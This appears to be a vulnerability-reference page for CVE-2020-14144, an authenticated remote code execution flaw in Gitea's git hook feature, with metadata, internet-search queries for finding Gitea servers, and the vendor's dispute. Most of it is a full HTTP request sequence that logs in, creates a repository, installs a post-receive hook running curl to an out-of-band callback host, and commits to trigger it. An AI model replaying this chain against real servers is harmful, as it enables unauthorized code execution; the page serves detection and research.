---
layout: post
cve_id: CVE-2020-14144
title: Gitea 1.1.0 - 1.12.5 - Remote Code Execution
pcap: true
pcap_path: /pcaps/2020/CVE-2020-14144.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2020/CVE-2020-14144.yaml
snort2_rule: N/A
snort3_rule: N/A
author: theamanrawat
severity: high
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary code on the target system.

  '
remediation: Fixed in version 1.16.7.
reference:
- https://dl.gitea.io/gitea/1.16.6
- https://github.com/go-gitea/gitea/pull/13058
- https://www.fzi.de/en/news/news/detail-en/artikel/fsa-2020-3-schwachstelle-in-gitea-1125-und-gogs-0122-ermoeglicht-ausfuehrung-von-code-nach-authent/
- https://nvd.nist.gov/vuln/detail/CVE-2020-14144
- https://docs.github.com/en/enterprise-server@2.19/admin/policies/creating-a-pre-receive-hook-script
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 7.2
  cve-id: CVE-2020-14144
  cwe-id: CWE-78
  epss-score: 0.93388
  epss-percentile: 0.99804
  cpe: cpe:2.3:a:gitea:gitea:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 7
  vendor: gitea
  product: gitea
  shodan-query:
  - html:"Powered by Gitea Version"
  - http.html:"powered by gitea version"
  - http.title:"gitea"
  - cpe:"cpe:2.3:a:gitea:gitea"
  fofa-query:
  - body="powered by gitea version"
  - title="gitea"
  google-query: intitle:"gitea"
tags:
- cve2020
- cve
- rce
- gitea
- authenticated
- git
- intrusive
- vuln
---

## üîç Vulnerability Description
Gitea 1.1.0 through 1.12.5 is susceptible to authenticated remote code execution, via the git hook functionality, in customer environments where the documentation is not understood (e.g., one viewpoint is that the dangerousness of this feature should be documented immediately above the ENABLE_GIT_HOOKS line in the config file). NOTE: The vendor has indicated this is not a vulnerability and states "This is a functionality of the software that is limited to a subset of accounts. If you give someone the privilege to execute arbitrary code on your server, they can execute arbitrary code on your server. We provide very clear warnings to users around this functionality and what it provides."


## üåê HTTP Request
```nohighlight
GET /user/login HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.5.20) Gecko/ Firefox/6.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /user/login HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:30.0) Gecko/20100101 Firefox/30.0
Connection: close
Content-Length: 47
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
_csrf=rTbW2l&user_name=79YoUA&password=wv9SdoUN
```

```nohighlight
GET /repo/create HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /repo/create HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
Connection: close
Content-Length: 180
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
_csrf=ALlo0W&uid=1&repo_name=38FQrG1sLWuGZFLLaQLbg1ipovW&private=on&description=&repo_template=&issue_labels=&gitignores=&license=&readme=Default&auto_init=on&default_branch=master
```

```nohighlight
POST /79YoUA/38FQrG1sLWuGZFLLaQLbg1ipovW/settings/hooks/git/post-receive HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Connection: close
Content-Length: 93
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
_csrf=ALlo0W&content=%23%21%2Fbin%2Fbash%0D%0Acurl+d5joiiple0o34e2g5270h31841ojx3fge.oast.pro
```

```nohighlight
GET /79YoUA/38FQrG1sLWuGZFLLaQLbg1ipovW/_new/master HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /79YoUA/38FQrG1sLWuGZFLLaQLbg1ipovW/_new/master HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Connection: close
Content-Length: 116
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
_csrf=ALlo0W&last_commit=bUe8MC&tree_path=test.txt&content=test&commit_summary=&commit_message=&commit_choice=direct
```

